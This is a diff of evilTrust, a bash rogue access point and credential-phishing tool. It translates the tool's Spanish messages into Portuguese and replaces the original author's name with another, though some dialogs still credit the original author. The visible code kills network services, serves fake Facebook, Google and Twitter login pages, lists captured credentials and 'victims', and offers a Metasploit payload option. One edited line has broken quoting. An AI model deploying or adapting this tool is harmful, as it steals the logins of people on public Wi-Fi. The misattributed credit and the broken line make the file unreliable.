@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# evilTrust v2.0, Author @s4vitar (Marcelo Vázquez)
+# evilTrust v2.0, Author @jeanpseven (Wrench)
 
 #Colours
 greenColour="\e[0;32m\033[1m"
@@ -50,18 +50,18 @@ function dependencies(){
 
 	for programa in "${dependencias[@]}"; do
 		if [ "$(command -v $programa)" ]; then
-			echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"
+			echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} A Ferramenta${endColour}${yellowColour} $programa${endColour}${grayColour} se encontra instalada"
 			let counter+=1
 		else
-			echo -e "${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"
+			echo -e "${redColour}[X]${endColour}${grayColour} A ferramenta${endColour}${yellowColour} $programa${endColour}${grayColour} não se encontra instalada"
 		fi; sleep 0.4
 	done
 
 	if [ "$(echo $counter)" == "3" ]; then
-		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Começando...\n"
 		sleep 3
 	else
-		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
+		echo -e "\n${redColour}[!]${endColour}${grayColour} É necessário ter as ferramentas php, dnsmasq e hostapd instaladas para rodar este script${endColour}\n"
 		tput cnorm; exit
 	fi
 }
@@ -70,9 +70,9 @@ function getCredentials(){
 
 	activeHosts=0
 	tput civis; while true; do
-		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciais (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-		echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
+		echo -e "${redColour}Vítimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
 		find \-name datos-privados.txt | xargs cat 2>/dev/null
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
@@ -94,19 +94,19 @@ function startAttack(){
 		let counter++
 	done; tput cnorm
 	checker=0; while [ $checker -ne 1 ]; do
-		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface
+		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nome da interface (Ej: wlan0mon): ${endColour}" && read choosed_interface
 
 		for interface in $(cat iface); do
 			if [ "$choosed_interface" == "$interface" ]; then
 				checker=1
 			fi
-		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
+		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} A interface não existe${endColour}"; fi
 	done
 
 	rm iface 2>/dev/null
-	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
+	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nome do ponto de acesso a ser usado (Ej: wifiGratis):${endColour} " && read -r use_ssid
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
-	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
+	echo -e "\n${redColour}[!] Matando todas as conexões...${endColour}\n"
 	sleep 2
 	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 	sleep 5
@@ -147,8 +147,8 @@ function startAttack(){
 	# Array de plantillas
 	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
 
-	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
-	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
+	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Se você quiser usar seu próprio modelo, crie outro diretório no projeto e especifique seu nome :)${endColour}\n\n"
+	echo -ne "${yellowColour}[*]${endColour}${grayColour} Modelo ${endColour}\n\n" a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
 
 	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
 		if [ "$plantilla" == "$template" ]; then
@@ -171,14 +171,14 @@ function startAttack(){
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
 		php -S 192.168.1.1:80 > /dev/null 2>&1 &
 		sleep 2
-		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configure um ouvinte no Metasploit de outro console da seguinte maneira:${endColour}"
 		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		cat msfconsole.rc
 		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-		echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
+		echo -e "\n${redColour}[!] Pressiona <Enter> para continuar${endColour}" && read
 		popd > /dev/null 2>&1; getCredentials
 	else
-		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
+		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando modelo personalizado...${endColour}"; sleep 1
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
 		pushd $template > /dev/null 2>&1
 		php -S 192.168.1.1:80 > /dev/null 2>&1 &
@@ -194,20 +194,20 @@ function helpPanel(){
 	sleep 0.05
 	echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
 	sleep 0.05
-	echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}s4vitar${endColour}${yellowColour})${endColour}${redColour}"
+	echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Feito por ${endColour}${redColour}Wrench${endColour}${yellowColour})${endColour}${redColour}"
 	sleep 0.05
 	echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
 	sleep 0.05
 	echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
 	echo -e "\n${grayColour}Uso:${endColour}"
-	echo -e "\t${redColour}[-m]${endColour}${blueColour} Modo de ejecución${endColour}${yellowColour} (terminal|gui)${endColour}${purpleColour} [-m terminal | -m gui]${endColour}"
-	echo -e "\t${redColour}[-h]${endColour}${blueColour} Mostrar este panel de ayuda${endColour}\n"
+	echo -e "\t${redColour}[-m]${endColour}${blueColour} Modo de execução${endColour}${yellowColour} (terminal|gui)${endColour}${purpleColour} [-m terminal | -m gui]${endColour}"
+	echo -e "\t${redColour}[-h]${endColour}${blueColour} Mostrar este panel de ajuda${endColour}\n"
 	exit 1
 }
 
 function guiMode(){
-	whiptail --title "evilTrust - by S4vitar" --msgbox "Bienvenido a evilTrust, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 8 78
-	whiptail --title "evilTrust - by S4vitar" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78
+	whiptail --title "evilTrust - by S4vitar" --msgbox "Bem-vindo ao evilTrust, uma ferramenta ofensiva ideal para implantar um Rogue AP ao seu gosto." 8 78
+	whiptail --title "evilTrust - by Wrench" --msgbox "Deixe-me verificar se você tem todos os programas necessários antes de começar..." 8 78
 
 	tput civis; dependencias=(php dnsmasq hostapd)
 
@@ -218,10 +218,10 @@ function guiMode(){
         done
 
         if [ $counter_dep -eq "3" ]; then
-		whiptail --title "evilTrust - by S4vitar" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
+		whiptail --title "evilTrust - by Wrench" --msgbox "Perfeito, parece que você tem tudo que precisa...." 8 78
 		tput civis
         else
-		whiptail --title "evilTrust - by S4vitar" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
+		whiptail --title "evilTrust - by Wrench" --msgbox "Parece que estão faltando algumas dependências, preciso que você tenha os utilitários php, dnsmasq e hostapd instalados" 8 78
                 exit 1
         fi
 
@@ -229,19 +229,19 @@ function guiMode(){
                 rm -rf credenciales.txt
         fi
 
-	whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
+	whiptail --title "evilTrust - by S4vitar" --msgbox "A seguir, vou listar suas interfaces de rede disponíveis, preciso que você escolha aquela que aceita o modo monitor" 8 78
 
 	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
         counter=1; for interface in $(cat iface); do
                 let counter++
         done
         checker=0; while [ $checker -ne 1 ]; do
-		choosed_interface=$(whiptail --inputbox "Interfaces de red disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "evilTrust - Interfaces de red" 3>&1 1>&2 2>&3)
+		choosed_interface=$(whiptail --inputbox "Interfaces de rede disponiveis:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "evilTrust - Interfaces de red" 3>&1 1>&2 2>&3)
                 for interface in $(cat iface); do
                         if [ "$choosed_interface" == "$interface" ]; then
                                 checker=1
                         fi
-                done; if [ $checker -eq 0 ]; then whiptail --title "evilTrust - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
+                done; if [ $checker -eq 0 ]; then whiptail --title "evilTrust - Erro de seleção de interface" --msgbox "A interface fornecida não existe, entre novamente na interface e verifique se está correta" 8 78; fi
         done
 
 	tput civis; whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
